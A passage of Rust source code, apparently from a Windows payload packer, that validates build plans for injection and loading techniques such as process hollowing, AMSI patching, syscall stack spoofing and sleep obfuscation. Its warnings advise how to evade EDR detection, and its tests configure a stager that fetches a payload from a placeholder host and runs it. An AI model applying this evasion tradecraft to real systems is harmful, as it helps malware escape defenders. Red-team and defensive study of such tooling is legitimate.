                "build.stub.api_resolution.hooks.sleep intercepts `Sleep` (and its API-set alias) \
                 only: `SleepEx`, a direct `NtDelayExecution`, and waits on objects are plain delays"
                    .to_string(),
            );
        }
    }

    if plan.build.output.kind == OutputKind::Dll {
        warnings.extend(dll_advisories(plan, &steps));
    }
    if plan.build.output.kind == OutputKind::Shellcode {
        warnings.extend(shellcode_advisories(plan, &steps));
    }
    warnings
}

/// The advisories specific to a host-loaded DLL build.
///
/// None of these are errors: the artifact works, but each one describes a way it
/// is louder than it has to be (`docs/design/dll-output.md` section 5).
fn dll_advisories(plan: &Plan, steps: &[ResolvedStep]) -> Vec<String> {
    let mut warnings = Vec::new();
    let output = &plan.build.output;

    if output.entry == DllEntry::Auto {
        warnings.push(
            "build.output.entry is 'auto': the export table advertises `JNI_OnLoad` next to a plain \
             chain-runner export, which no ordinary DLL does; a host-specific entry is less \
             conspicuous"
                .to_string(),
        );
    }

    if output.sign.is_none() {
        warnings.push(
            "build.output.kind is 'dll' without `build.output.sign`: the host loads the file with \
             the image loader, so it is scanned on load, and an unsigned module inside a signed \
             host process is what an EDR reports first"
                .to_string(),
        );
    }

    if output.arch == Arch::X86 {
        warnings.push(
            "build.output.kind is 'dll' with arch 'x86': the host and the payload must be 32-bit \
             too, the export follows the stdcall four-argument shape (only a caller that declares \
             it is safe), and indirect syscalls stay x64-only"
                .to_string(),
        );
    }

    let extension = output.path.extension().and_then(|ext| ext.to_str());
    if !extension.is_some_and(|ext| ext.eq_ignore_ascii_case("dll")) {
        warnings.push(
            "build.output.kind is 'dll' but the output path does not end in `.dll`: the OS loader \
             and most hosts expect the extension (a different one is a deliberate choice)"
                .to_string(),
        );
    }

    for step in steps {
        if matches!(&step.technique, TechniqueKind::PatchAmsi { .. }) {
            warnings.push(format!(
                "step {}: 'patch_amsi' loads `amsi.dll` when it is not already loaded, and a DLL \
                 host (`java.exe`, `python.exe`) usually has none — the step would bring the \
                 scanner into the process",
                step.index
            ));
        }
        if let TechniqueKind::ProcessMitigations { params } = &step.technique {
            if params.block_dlls {
                warnings.push(format!(
                    "step {}: 'process_mitigations' with `block_dlls` applies the DLL block to the \
                     *host* process (a DLL build has no image of its own): the host (`python.exe`, \
                     `java.exe`) can no longer load a non-Microsoft module, which can break the \
                     host's own plugins",
                    step.index
                ));
            }
        }
        if matches!(&step.technique, TechniqueKind::ImagePathSpoofing { .. }) {
            warnings.push(format!(
                "step {}: 'image_path_spoofing' repoints the PEB, and in a DLL build the PEB is the \
                 *host's* (`python.exe`, `java.exe`): the host process would report the decoy path",
                step.index
            ));
        }
    }

    if output.entry.export_name().is_some() {
        for step in steps {
            if let Some(technique) = terminal_technique(step) {
                warnings.push(format!(
                    "step {}: '{technique}' does not return control to the loader, and the DLL's \
                     plain export waits for the chain: the caller's thread is held for the \
                     payload's lifetime (that is what keeps `rundll32` alive)",
                    step.index
                ));
                break;
            }
        }
    }

    warnings
}

/// The advisories specific to a `kind: shellcode` build.
///
/// None are errors: the artifact works, but each one names a way it is louder
/// than it has to be, or a choice the operator should make deliberately.
fn shellcode_advisories(plan: &Plan, steps: &[ResolvedStep]) -> Vec<String> {
    let mut warnings = Vec::new();
    let output = &plan.build.output;

    let extension = output.path.extension().and_then(|ext| ext.to_str());
    if !extension.is_some_and(|ext| ext.eq_ignore_ascii_case("bin")) {
        warnings.push(
            "build.output.kind is 'shellcode' but the output path does not end in `.bin`: the \
             artifact is raw shellcode, not a PE (a different extension is a deliberate choice)"
                .to_string(),
        );
    }

    warnings.push(
        "build.output.kind is 'shellcode': the artifact is raw bytes — a host must map and run \
         them (`msbuild` inline task, a JVM through the FFM API, …), and the reflective loader \
         plus executable memory are well-known EDR signatures"
            .to_string(),
    );

    if output.entry == DllEntry::Auto {
        warnings.push(
            "build.output.entry is 'auto': the wrapped DLL advertises `JNI_OnLoad` next to the \
             plain export the loader actually calls; `export:<name>` is smaller and less \
             conspicuous"
                .to_string(),
        );
    }

    for step in steps {
        if matches!(&step.technique, TechniqueKind::PatchAmsi { .. }) {
            warnings.push(format!(
                "step {}: 'patch_amsi' loads `amsi.dll` when it is not already loaded, and the \
                 host that runs the shellcode (`msbuild.exe`, `java.exe`) usually has none — the \
                 step would bring the scanner into the process",
                step.index
            ));
        }
    }

    warnings
}
/// `build.stub` itself may be empty (builtin stub, default syscall mode,
/// default obfuscation); an unknown `syscalls.mode`/`syscalls.resolver` or
/// `strings.strategy` is a clear error.
fn validate_stub(stub: &StubPlan) -> Result<()> {
    SyscallsConfig::from_yaml(stub.syscalls.as_ref())?;
    StringsConfig::from_yaml(stub.strings.as_ref())?;
    Ok(())
}

/// Validates `build.stub.api_resolution` and its coupling with the syscall layer
/// and the payload format.
///
/// `mode: proxy` is only meaningful when intercepted calls can be re-routed
/// through the syscall layer (so the imports leave the stub's IAT) and when the
/// payload has an import table to rewrite.
fn validate_api_resolution(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
    let config = ApiResolutionConfig::from_yaml(plan.build.stub.api_resolution.as_ref())?;
    if config.mode != ApiResolutionMode::Proxy {
        return Ok(());
    }

    // The proxies are functions in the loader image with loader-wide state, so
    // the mode is meaningful for exactly one payload load.
    let executions: Vec<&ResolvedStep> = steps.iter().filter(|step| step.is_execution()).collect();
    if executions.len() != 1 {
        return Err(PackerError::Validation(
            "build.stub.api_resolution.mode 'proxy' is loader-wide (it rewrites the loaded \
             payload's IAT), so it is not supported when the runtime loads more than one payload: \
             use a single Execution step"
                .to_string(),
        ));
    }
    let step = executions[0];

    let syscalls = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())?;
    if syscalls.mode != SyscallsMode::Indirect {
        return Err(PackerError::Validation(
            "build.stub.api_resolution.mode 'proxy' requires 'build.stub.syscalls.mode: indirect': \
             the re-routed calls would otherwise fall back to the Win32 APIs and the intercepted \
             imports would reappear in the stub's IAT"
                .to_string(),
        ));
    }

    let Some(payload) = &step.payload else {
        return Err(PackerError::Validation(
            "build.stub.api_resolution.mode 'proxy' needs a payload with an import table \
             (format: pe or dll)"
                .to_string(),
        ));
    };
    if !payload.plan.format.is_pe_image() {
        return Err(PackerError::Validation(format!(
            "build.stub.api_resolution.mode 'proxy' requires a payload with an import table \
             (format: pe or dll), not '{}'",
            payload.plan.format.label()
        )));
    }

    // The generated proxies are ordinary functions in the loader image, with
    // their own data (obfuscated names, the SSN table, the syscall trampoline).
    // A hollowed payload runs in a *different* process, which has none of that,
    // so its IAT there can only point at the real exports: the mode cannot apply.
    // Failing loudly beats silently not proxying. See Phase E in the doc.
    if matches!(
        step.technique,
        TechniqueKind::ProcessHollowing { .. } | TechniqueKind::PeInjection { .. }
    ) {
        return Err(PackerError::Validation(
            "build.stub.api_resolution.mode 'proxy' is not supported with process_hollowing or \
             pe_injection: the proxies live in the loader image, which is not the process where \
             the payload runs, so the payload's IAT there can only point at the real exports. Use \
             reflective_loading (the payload runs in the loader's process). See \
             docs/api-resolution.md (Phase E)."
                .to_string(),
        ));
    }

    // The Sleep hook conceals the *mapped payload*: only the in-process mapper
    // records that region, and only reflective_loading can host the proxies.
    if config.hooks.sleep.is_some()
        && !matches!(step.technique, TechniqueKind::ReflectiveLoading { .. })
    {
        return Err(PackerError::Validation(
            "build.stub.api_resolution.hooks.sleep needs reflective_loading: the loader records \
             the mapped payload image there, and the hook encrypts exactly that region while the \
             payload sleeps"
                .to_string(),
        ));
    }

    Ok(())
}

/// Validates a payload's format against the Execution technique that loads it.
///
/// Two rules that `serde` cannot express: `export` only makes sense for a DLL,
/// and `process_hollowing` can only run a PE executable today (it replaces a
/// suspended process's image; a DLL has no process entry point to run and raw
/// shellcode has no image at all). A managed assembly is neither mapped nor
/// hollowed: `dotnet_hosting` hosts the CLR and loads its bytes.
fn validate_payload_format(step: &ResolvedStep, payload: &ResolvedPayload) -> Result<()> {
    let format = payload.plan.format;
    if let Some(export) = &payload.plan.export {
        if format != PayloadFormat::Dll {
            return Err(PackerError::Validation(format!(
                "payload '{}' declares 'export' but its format is '{}': 'export' only applies to \
                 'format: dll'",
                payload.name,
                format.label()
            )));
        }
        if export.trim().is_empty() {
            return Err(PackerError::Validation(format!(
                "payload '{}' has an empty 'export'",
                payload.name
            )));
        }
    }

    let hosts_the_clr = matches!(step.technique, TechniqueKind::DotnetHosting { .. });
    if format == PayloadFormat::Dotnet && !hosts_the_clr {
        return Err(PackerError::Validation(format!(
            "payload '{}' has 'format: dotnet', which needs 'technique: dotnet_hosting' (this step \
             runs '{}', which does not run a managed assembly)",
            payload.name,
            step.technique.name()
        )));
    }
    if format != PayloadFormat::Dotnet && hosts_the_clr {
        return Err(PackerError::Validation(format!(
            "'technique: dotnet_hosting' (step {}) needs 'format: dotnet'; payload '{}' is '{}'",
            step.index,
            payload.name,
            format.label()
        )));
    }

    // The same mutual implication for PowerShell: a `.ps1` is run by
    // `powershell_hosting`, and that technique runs nothing else.
    let hosts_powershell = matches!(
        step.technique,
        TechniqueKind::PowershellHosting { .. } | TechniqueKind::ImportPowermodule { .. }
    );
    if format == PayloadFormat::Powershell && !hosts_powershell {
        return Err(PackerError::Validation(format!(
            "payload '{}' has 'format: powershell', which needs 'technique: powershell_hosting' \
             (this step runs '{}', which does not host PowerShell)",
            payload.name,
            step.technique.name()
        )));
    }
    if format != PayloadFormat::Powershell && hosts_powershell {
        return Err(PackerError::Validation(format!(
            "'technique: powershell_hosting' (step {}) needs 'format: powershell'; payload '{}' is \
             '{}'",
            step.index,
            payload.name,
            format.label()
        )));
    }

    // Every technique declares the payload formats it accepts in the registry
    // (`TechniqueDef::formats`); that is the single source for this check, so a
    // new technique states its formats once and both the build and the docs read
    // it.
    if let Some(def) = crate::techniques::find(step.technique.name()) {
        if !def.formats.contains(&format) {
            let accepts = def
                .formats
                .iter()
                .map(|accepted| accepted.label())
                .collect::<Vec<_>>()
                .join(", ");
            return Err(PackerError::Validation(format!(
                "payload '{}' has 'format: {}', which '{}' does not accept (it runs: {accepts})",
                payload.name,
                format.label(),
                def.name
            )));
        }
    }

    Ok(())
}

/// Rejects a payload `sha256` that is not exactly 64 hex characters.
///
/// Catching a malformed pin here gives a clear message instead of a confusing
/// "payload mismatch" at build time.
fn validate_payload_sha256(payload: &ResolvedPayload) -> Result<()> {
    let Some(hash) = payload.plan.sha256.as_deref() else {
        return Ok(());
    };
    let hash = hash.trim();
    if hash.len() != 64 || !hash.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(PackerError::Validation(format!(
            "payload '{}' sha256 must be 64 hex characters (got '{hash}')",
            payload.name
        )));
    }
    Ok(())
}

/// Validates `output.sign`.
///
/// Only the mode-specific requirements are checked here; locating `signtool`
/// and the certificate happens at build time (so the error names what is
/// actually missing on the machine).
fn validate_sign(plan: &Plan) -> Result<()> {
    let Some(sign) = &plan.build.output.sign else {
        return Ok(());
    };
    match sign.mode.as_str() {
        "none" => {}
        "lab" => {}
        "store" => {
            if sign.thumbprint.is_none() && sign.subject.is_none() {
                return Err(PackerError::Validation(
                    "output.sign.mode 'store' needs either 'thumbprint' or 'subject'".to_string(),
                ));
            }
        }
        "file" => {
            if sign.file.is_none() {
                return Err(PackerError::Validation(
                    "output.sign.mode 'file' needs 'file' (a .pfx/.p12 path)".to_string(),
                ));
            }
        }
        other => {
            return Err(PackerError::Validation(format!(
                "invalid output.sign.mode '{other}': expected none, lab, store or file"
            )));
        }
    }
    if let Some(url) = &sign.timestamp_url {
        if !(url.starts_with("http://") || url.starts_with("https://")) {
            return Err(PackerError::Validation(format!(
                "output.sign.timestamp_url '{url}' must be an http(s) URL"
            )));
        }
    }
    Ok(())
}

/// Rejects a technique that has no implementation for the requested architecture.
///
/// Every technique declares the capabilities it needs (`TechniqueDef::requires`).
/// Its architecture capability (`WindowsX64` / `WindowsX86`) must match
/// `build.output.arch`: the stub and the payload share one address space, so an
/// x64-only fragment cannot be linked into an i686 stub (nor the reverse).
fn validate_capabilities(plan: &Plan, step: &ResolvedStep) -> Result<()> {
    let arch = plan.build.output.arch;
    let required = match arch {
        Arch::X64 => Capability::WindowsX64,
        Arch::X86 => Capability::WindowsX86,
    };
    let Some(def) = crate::techniques::find(step.technique.name()) else {
        return Ok(());
    };
    if !def.requires.contains(&required) {
        return Err(PackerError::Validation(format!(
            "step {}: technique '{}' does not support build.output.arch '{}' yet: it requires {}; \
             the packer can compile an {} stub, but this technique has no {} fragment",
            step.index,
            def.name,
            arch.label(),
            capabilities_label(def.requires),
            arch.label(),
            arch.label()
        )));
    }
    Ok(())
}

/// Rejects an injection target whose image cannot run in the stub's process.
///
/// The techniques that spawn their own target (`process_hollowing`,
/// `early_bird`, `pe_injection`) must spawn one of the stub's own architecture:
/// an x86 stub cannot inject into a 64-bit `svchost.exe` and vice versa. When
/// the target is a local file the check is exact; a target that does not resolve
/// locally (`$arg.N$`, a remote path, a missing file) is left to run time, where
/// the technique fails with its own error.
///
/// `C:\Windows\System32` is redirected to `SysWOW64` for a 32-bit process, so
/// the path is mapped the way WOW64 would resolve it before the file is read —
/// the default `System32\svchost.exe` is a 64-bit image on a 64-bit host but
/// the x86 stub actually gets the 32-bit one.
fn validate_injection_target(plan: &Plan, step: &ResolvedStep) -> Result<()> {
    let Some((technique, target)) = injection_target(step) else {
        return Ok(());
    };
    let arch = plan.build.output.arch;
    let Some(path) = wow64_resolve(target, arch) else {
        return Ok(());
    };
    let Ok(bytes) = std::fs::read(&path) else {
        // Not a local file (a runtime argument, a remote path, or a target
        // that only exists on the host): nothing to check here.
        return Ok(());
    };
    let Ok(info) = crate::engine::pe::parse(&bytes) else {
        return Ok(());
    };
    if info.arch() != Some(arch) {
        return Err(PackerError::Validation(format!(
            "{technique} target '{target}' is a {} image but build.output.arch is '{}': the target must match the stub's architecture ({target} resolves to '{}' under WOW64)",
            info.arch().map(|a| a.label()).unwrap_or("non-PE"),
            arch.label(),
            path.display()
        )));
    }
    Ok(())
}

/// The spawn target of a technique that creates its own process, with the
/// technique's name for the diagnostics.
fn injection_target(step: &ResolvedStep) -> Option<(&'static str, &str)> {
    match &step.technique {
        TechniqueKind::ProcessHollowing { params } => Some(("process_hollowing", &params.target)),
        TechniqueKind::EarlyBird { params } => Some(("early_bird", &params.target)),
        TechniqueKind::PeInjection { params } => Some(("pe_injection", &params.target)),
        // The hijack target is an image name of a *running* process (or an
        // explicit pid), so the architecture check only applies when it names a
        // local file.
        TechniqueKind::ThreadHijacking { params } if params.pid.is_none() => {
            Some(("thread_hijacking", &params.target))
        }
        _ => None,
    }
}

/// Maps a Windows path the way the target process would see it, or `None` when
/// it cannot be a local file (a runtime argument, or not an absolute path).
///
/// Only a 32-bit process is redirected: its `System32` is `SysWOW64`. A 64-bit
/// process sees both directories as they are (`SysWOW64` keeps the 32-bit
/// images), so a 64-bit target path is taken literally — except when the packer
/// itself is a 32-bit process, whose own read of `System32` would be redirected
/// to the 32-bit image: that case asks for the unredirected view through
/// `Sysnative`, the WOW64 alias that only exists for 32-bit callers.
fn wow64_resolve(target: &str, arch: Arch) -> Option<std::path::PathBuf> {
    if target.contains("$arg.") || target.trim().is_empty() {
        return None;
    }
    let (from, to) = match arch {
        Arch::X86 => ("System32", "SysWOW64"),
        Arch::X64 if cfg!(target_arch = "x86") => ("System32", "Sysnative"),
        Arch::X64 => return local_path(target),
    };
    let needle = format!("\\{from}\\");
    let mapped = match target
        .to_ascii_lowercase()
        .find(&needle.to_ascii_lowercase())
    {
        Some(index) => {
            let mut text = target.to_string();
            text.replace_range(index + 1..index + 1 + from.len(), to);
            text
        }
        None => target.to_string(),
    };
    local_path(&mapped)
}

/// The path as a `PathBuf`, or `None` when it cannot be a local file.
fn local_path(target: &str) -> Option<std::path::PathBuf> {
    let path = std::path::PathBuf::from(target);
    if path.is_absolute() {
        Some(path)
    } else {
        None
    }
}

/// Human list of a technique's capabilities (`x64 + administrator rights`).
fn capabilities_label(requires: &[Capability]) -> String {
    requires
        .iter()
        .map(|capability| match capability {
            Capability::WindowsX64 => "x64",
            Capability::WindowsX86 => "x86",
            Capability::KernelAccess => "kernel access",
            Capability::AdminRequired => "administrator rights",
        })
        .collect::<Vec<_>>()
        .join(" + ")
}

/// Rejects an x64-only loader configuration on an x86 build.
///
/// `syscalls.mode: indirect` relies on the x64 `syscall; ret` gadget and an x64
/// `global_asm!` trampoline; x86 has neither (and the WOW64 SSNs differ), so the
/// x86 path is a second implementation, not a flag.
fn validate_syscalls_arch(plan: &Plan) -> Result<()> {
    if plan.build.output.arch != Arch::X86 {
        return Ok(());
    }
    let syscalls = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())?;
    if syscalls.stack_spoofing.is_some() {
        return Err(PackerError::Validation(
            "build.stub.syscalls.stack_spoofing is x86_64-only: the fabricated frames and the \
             syscall trampoline are x64. Use build.output.arch: x64"
                .to_string(),
        ));
    }
    if syscalls.mode == SyscallsMode::Indirect {
        return Err(PackerError::Validation(
            "build.stub.syscalls.mode 'indirect' is x64-only for now: the trampoline is x64 (x86 \
             has no 'syscall; ret' gadget, and the WOW64 SSNs differ). Use 'mode: none'"
                .to_string(),
        ));
    }
    Ok(())
}

/// Validates the sleep-obfuscation parameters.
///
/// Only the ekko variant and the `[payload]` region list are implemented in
/// this phase; the other values parse fine but are rejected here with a
/// pointer to the missing phase.
/// Validates `stack_spoofing` beyond its mode/arch checks.
///
/// The block rewrites the trampoline the `nt_*` helpers call; a build with no
/// technique or proxy that uses the syscall layer has nothing to spoof, so the
/// block would be emitted into a no-op layer (or not at all). Fail loudly.
fn validate_stack_spoofing(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
    let config = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())?;
    if config.stack_spoofing.is_none() {
        return Ok(());
    }

    let union: Vec<RuntimeStep> = steps
        .iter()
        .map(|step| RuntimeStep::new(step.technique.clone()))
        .collect();
    let api = ApiResolutionConfig::from_yaml(plan.build.stub.api_resolution.as_ref())?;
    if crate::engine::syscalls::required(&union).is_empty() && api.required_syscalls().is_empty() {
        return Err(PackerError::Validation(
            "build.stub.syscalls.stack_spoofing needs at least one nt_* call: no technique or API \
             proxy uses the syscall layer, so there is no trampoline to spoof"
                .to_string(),
        ));
    }
    Ok(())
}

fn validate_sleep_obfuscation(step: &ResolvedStep) -> Result<()> {
    let TechniqueKind::SleepObfuscation { params } = &step.technique else {
        return Ok(());
    };

    if params.variant != crate::techniques::sleep_obfuscation::Variant::Ekko {
        return Err(PackerError::Validation(format!(
            "sleep_obfuscation: variant '{}' is not implemented yet; phase 6 ships 'ekko' only",
            params.variant.label()
        )));
    }

    let only_payload = params.encrypt_regions.len() == 1
        && params.encrypt_regions[0]
            == crate::techniques::sleep_obfuscation::EncryptRegion::Payload;
    if !only_payload {
        return Err(PackerError::Validation(
            "sleep_obfuscation: only encrypt_regions: [payload] is implemented in this phase; 'stack' and 'all' need a stack-safe ROP chain (future phase)".to_string(),
        ));
    }

    if params.sleep_ms > u32::MAX as u64 {
        return Err(PackerError::Validation(format!(
            "sleep_obfuscation: sleep_ms {} exceeds the maximum of {}",
            params.sleep_ms,
            u32::MAX
        )));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(yaml: &str) -> Plan {
        serde_yml::from_str(yaml).expect("valid YAML")
    }

    /// A minimal valid plan, with optional extra `build` / `output` blocks.
    fn plan_yaml(build_extra: &str, out_extra: &str, runtime: &str) -> String {
        format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n{build_extra}  output:\n    path: ./dist/o.exe\n    arch: x64\n    strip: true\n    trim_paths: all\n{out_extra}runtime:\n{runtime}"
        )
    }

    /// A minimal valid plan with the given runtime body and one payload.
    fn with_runtime(runtime: &str) -> String {
        plan_yaml("", "", runtime)
    }

    fn with_stub(stub: &str) -> String {
        plan_yaml(
            &format!("  stub:\n{stub}\n"),
            "",
            "  - technique: reflective_loading\n",
        )
    }

    fn with_sign(sign: &str) -> String {
        plan_yaml(
            "",
            &format!("    sign:\n{sign}\n"),
            "  - technique: reflective_loading\n",
        )
    }

    #[test]
    fn accepts_a_minimal_plan() {
        let plan = parse(&with_runtime("  - technique: reflective_loading\n"));
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_an_empty_name() {
        let yaml =
            with_runtime("  - technique: reflective_loading\n").replace("name: t", "name: ' '");
        assert!(validate(&parse(&yaml)).is_err());
    }

    #[test]
    fn rejects_an_empty_output_path() {
        let yaml = with_runtime("  - technique: reflective_loading\n").replace("./dist/o.exe", "");
        assert!(validate(&parse(&yaml)).is_err());
    }

    #[test]
    fn accepts_two_execution_techniques_as_separate_steps() {
        // In the flat model two execution techniques are separate steps with
        // their own payloads, so they do not conflict.
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: process_hollowing\n    params: { payload: b, target: \"C:\\\\x.exe\" }\n",
        );
        validate(&plan).expect("valid");
    }

    #[test]
    fn accepts_a_preparation_then_an_execution() {
        let plan = parse(&with_runtime(
            "  - technique: patch_amsi\n  - technique: reflective_loading\n",
        ));
        validate(&plan).expect("valid");
    }

    #[test]
    fn accepts_several_execution_steps() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: sleep\n    params: { ms: 5 }\n  - technique: process_hollowing\n    params: { payload: b, target: \"C:\\\\x.exe\" }\n",
        );
        validate(&plan).expect("valid");
    }

    /// A plan whose runtime stages the payload `p` with the given stager params
    /// and then runs it reflectively.
    fn with_stager(params: &str) -> String {
        with_runtime(&format!(
            "  - technique: network_stager\n    params: {params}\n  - technique: reflective_loading\n    params: {{ payload: p }}\n"
        ))
    }

    #[test]
    fn accepts_a_winhttp_stager_with_an_https_url() {
        let plan = parse(&with_stager(
            "{ payload: p, url: \"https://example.invalid/a.bin\", downloader: winhttp }",
        ));
        validate(&plan).expect("valid");
    }

    #[test]
    fn accepts_a_stager_with_an_ftp_url() {
        let plan = parse(&with_stager(
            "{ payload: p, url: \"ftp://example.invalid/a.bin\" }",
        ));
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_explicit_winhttp_with_a_non_http_scheme() {
        let plan = parse(&with_stager(
            "{ payload: p, url: \"ftp://example.invalid/a.bin\", downloader: winhttp }",
        ));
        let err = validate(&plan).expect_err("winhttp needs http(s)");
        assert!(err.to_string().contains("winhttp"), "unclear: {err}");
    }

    #[test]
    fn rejects_an_in_process_url_that_cannot_be_parsed() {
        let plan = parse(&with_stager(
            "{ payload: p, url: \"https://\", downloader: winhttp }",
        ));
        let err = validate(&plan).expect_err("no host");
        assert!(err.to_string().contains("host"), "unclear: {err}");
    }

    #[test]
    fn rejects_a_terminal_step_before_the_last_one() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: b }\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("terminal not last");
        assert!(
            err.to_string().contains("terminal") || err.to_string().contains("later"),
            "unclear: {err}"
        );
    }

    #[test]
    fn accepts_a_terminal_step_at_the_end() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: reflective_loading\n    params: { payload: b }\n",
        );
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_shellcode_with_process_hollowing() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: process_hollowing\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        let err = validate(&plan).expect_err("shellcode hollowing");
        assert!(
            err.to_string().contains("process_hollowing"),
            "unclear: {err}"
        );
    }

    #[test]
    fn rejects_a_dll_with_process_hollowing() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: process_hollowing\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        assert!(validate(&plan).is_err());
    }

    /// The three in-process runners execute raw code, so they take shellcode.
    #[test]
    fn accepts_shellcode_with_the_in_process_runners() {
        for technique in ["execution_callbacks", "module_stomping", "fibers"] {
            let plan = parse(&format!(
                "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.bin, format: shellcode }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: {technique}\n    params: {{ payload: a }}\n"
            ));
            validate(&plan).unwrap_or_else(|e| panic!("{technique}: {e}"));
        }
    }

    #[test]
    fn rejects_a_pe_payload_with_the_in_process_runners() {
        for technique in ["execution_callbacks", "module_stomping", "fibers"] {
            let plan = parse(&format!(
                "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.exe, format: pe }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: {technique}\n    params: {{ payload: a }}\n"
            ));
            let err = validate(&plan).expect_err("a PE needs an image mapper");
            assert!(err.to_string().contains(technique), "unclear: {err}");
        }
    }

    #[test]
    fn rejects_a_shellcode_payload_with_pe_injection() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: pe_injection\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        let err = validate(&plan).expect_err("shellcode has no image to map");
        assert!(err.to_string().contains("pe_injection"), "unclear: {err}");
    }

    #[test]
    fn accepts_a_pe_payload_with_pe_injection() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: pe_injection\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        validate(&plan).expect("pe_injection maps a PE image");
    }

    #[test]
    fn accepts_shellcode_with_early_bird() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: early_bird\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        validate(&plan).expect("early_bird runs shellcode");
    }

    #[test]
    fn rejects_a_pe_payload_with_early_bird() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: early_bird\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        let err = validate(&plan).expect_err("early_bird queues raw code");
        assert!(err.to_string().contains("early_bird"), "unclear: {err}");
    }

    /// The architecture check covers every technique that spawns its own target.
    #[test]
    fn rejects_an_early_bird_target_of_the_wrong_architecture() {
        let target = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests")
            .join("fixtures")
            .join("minimal_x86.exe");
        if !target.is_file() {
            return;
        }
        let plan = parse(&format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.bin, format: shellcode }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: early_bird\n    params: {{ payload: a, target: '{}' }}\n",
            target.display()
        ));
        let err = validate(&plan).expect_err("wrong-arch target");
        assert!(err.to_string().contains("early_bird"), "unclear: {err}");
        assert!(err.to_string().contains("architecture"), "unclear: {err}");
    }

    #[test]
    fn rejects_a_dll_payload_with_fibers() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: fibers\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("a DLL needs an image mapper");
        assert!(err.to_string().contains("fibers"), "unclear: {err}");
    }

    #[test]
